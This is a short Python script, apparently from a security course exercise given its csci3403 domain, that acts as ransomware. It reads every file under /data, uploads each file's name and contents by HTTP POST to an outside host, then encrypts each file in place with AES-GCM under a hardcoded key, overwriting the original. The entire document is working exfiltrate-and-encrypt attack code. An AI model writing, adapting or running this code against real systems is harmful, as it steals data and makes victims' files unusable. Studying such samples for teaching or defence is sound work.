import base64
from pathlib import Path
import random
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
import requests

key = base64.b64decode("av5ErNYAvza1A7Nw1DI21Q==")

def main():
    files = Path('/data').glob("*")

    for file in files:
        content = file.read_bytes()

        requests.post("https://4flgfoswjlzecgbdu2gxkcnntv6nqzszdkq5mtoe5i.csci3403.com/upload", data={
            "name": file,
            "content": content,
        })

        nonce = random.randbytes(12)
        cipher = AESGCM(key)
        encrypted = cipher.encrypt(nonce, content, None)

        file.write_bytes(nonce + encrypted)

if __name__ == "__main__":
    main()